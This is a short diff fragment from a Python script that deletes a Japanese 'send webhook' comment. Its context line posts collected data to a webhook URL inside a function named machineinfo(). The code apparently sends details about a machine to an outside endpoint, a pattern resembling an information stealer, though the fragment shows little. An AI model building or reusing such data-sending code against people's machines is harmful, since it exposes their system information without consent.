@@ -87,5 +87,4 @@ def machineinfo():
         ]
     }
 
-    # Webhook送信
     response2 = requests.post(h00k, json=data2)
